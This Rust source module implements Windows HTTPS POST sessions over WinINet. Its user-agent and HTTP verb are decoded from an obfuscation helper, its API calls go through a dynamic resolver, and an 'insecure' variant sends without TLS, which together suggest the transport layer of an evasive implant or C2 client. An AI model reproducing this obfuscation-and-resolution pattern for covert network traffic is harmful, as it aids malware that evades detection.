use crate::log::LogSink;

pub struct HttpsSession {
    #[cfg(windows)]
    pub h_internet: *mut std::ffi::c_void,
    #[cfg(windows)]
    pub h_connect: *mut std::ffi::c_void,
    #[cfg(not(windows))]
    _phantom: (),
}

#[cfg(not(windows))]
pub fn init(_host: &str, _port: u16, _log: &LogSink) -> Result<HttpsSession, String> {
    Err("requires Windows".to_string())
}

#[cfg(not(windows))]
pub fn post(_session: &HttpsSession, _path: &str, _body: &[u8], _log: &LogSink) -> Result<Vec<u8>, String> {
    Err("requires Windows".to_string())
}

#[cfg(not(windows))]
pub fn post_insecure(_session: &HttpsSession, _path: &str, _body: &[u8], _log: &LogSink) -> Result<Vec<u8>, String> {
    Err("requires Windows".to_string())
}

#[cfg(not(windows))]
pub fn close(_session: HttpsSession) {}

#[cfg(windows)]
pub fn init(host: &str, port: u16, log: &LogSink) -> Result<HttpsSession, String> {
    use std::ptr;

    const INTERNET_OPEN_TYPE_DIRECT: u32 = 1;
    const INTERNET_SERVICE_HTTP: u32 = 3;

    unsafe {
        let agent = crate::obf::s(crate::obf::USER_AGENT);
        let mut agent_bytes: Vec<u8> = agent.into_bytes();
        agent_bytes.push(0);

        let h_internet = crate::resolve::InternetOpenA(
            agent_bytes.as_ptr(),
            INTERNET_OPEN_TYPE_DIRECT,
            ptr::null(),
            ptr::null(),
            0,
        );
        if h_internet.is_null() {
            return Err("session initialization failed".to_string());
        }

        let mut host_bytes: Vec<u8> = host.as_bytes().to_vec();
        host_bytes.push(0);

        let h_connect = crate::resolve::InternetConnectA(
            h_internet,
            host_bytes.as_ptr(),
            port,
            ptr::null(),
            ptr::null(),
            INTERNET_SERVICE_HTTP,
            0,
            0,
        );
        if h_connect.is_null() {
            crate::resolve::InternetCloseHandle(h_internet);
            return Err("connection setup failed".to_string());
        }

        log.step("Session established");

        Ok(HttpsSession {
            h_internet,
            h_connect,
        })
    }
}

#[cfg(windows)]
pub fn post(session: &HttpsSession, path: &str, body: &[u8], log: &LogSink) -> Result<Vec<u8>, String> {
    post_inner(session, path, body, false, log)
}

#[cfg(windows)]
pub fn post_insecure(session: &HttpsSession, path: &str, body: &[u8], log: &LogSink) -> Result<Vec<u8>, String> {
    post_inner(session, path, body, true, log)
}

#[cfg(windows)]
fn post_inner(session: &HttpsSession, path: &str, body: &[u8], insecure: bool, log: &LogSink) -> Result<Vec<u8>, String> {
    use std::ffi::c_void;
    use std::ptr;

    const INTERNET_FLAG_SECURE: u32 = 0x00800000;
    const INTERNET_FLAG_NO_CACHE_WRITE: u32 = 0x04000000;
    const INTERNET_FLAG_RELOAD: u32 = 0x80000000;
    const INTERNET_FLAG_IGNORE_CERT_CN_INVALID: u32 = 0x00001000;
    const INTERNET_FLAG_IGNORE_CERT_DATE_INVALID: u32 = 0x00002000;

    unsafe {
        let verb = crate::obf::s(crate::obf::HTTP_POST);
        let mut verb_bytes: Vec<u8> = verb.into_bytes();
        verb_bytes.push(0);

        let mut path_bytes: Vec<u8> = path.as_bytes().to_vec();
        path_bytes.push(0);

        let mut flags = INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD;
        if !insecure {
            flags |= INTERNET_FLAG_SECURE;
        }

        let h_request = crate::resolve::HttpOpenRequestA(
            session.h_connect,
            verb_bytes.as_ptr(),
            path_bytes.as_ptr(),
            ptr::null(),
            ptr::null(),
            ptr::null(),
            flags,
            0,
        );
        if h_request.is_null() {
            return Err("request creation failed".to_string());
        }

        let sent = crate::resolve::HttpSendRequestA(
            h_request,
            ptr::null(),
            0,
            body.as_ptr() as *const c_void,
            body.len() as u32,
        );
        if sent == 0 {
            crate::resolve::InternetCloseHandle(h_request);
            return Err("request send failed".to_string());
        }

        let response = read_response(h_request)?;
        crate::resolve::InternetCloseHandle(h_request);

        log.info(format!("  Response: {} bytes", response.len()));
        Ok(response)
    }
}

#[cfg(windows)]
fn read_response(request: *mut std::ffi::c_void) -> Result<Vec<u8>, String> {
    let mut result = Vec::new();
    let mut buf = [0u8; 4096];
    loop {
        let mut bytes_read: u32 = 0;
        let ok = unsafe {
            crate::resolve::InternetReadFile(
                request,
                buf.as_mut_ptr(),
                buf.len() as u32,
                &mut bytes_read,
            )
        };
        if ok == 0 {
            return Err("response read failed".to_string());
        }
        if bytes_read == 0 {
            break;
        }
        result.extend_from_slice(&buf[..bytes_read as usize]);
        if result.len() > 4 * 1024 * 1024 {
            return Err("response too large".to_string());
        }
    }
    Ok(result)
}

#[cfg(windows)]
pub fn close(session: HttpsSession) {
    unsafe {
        crate::resolve::InternetCloseHandle(session.h_connect);
        crate::resolve::InternetCloseHandle(session.h_internet);
    }
}
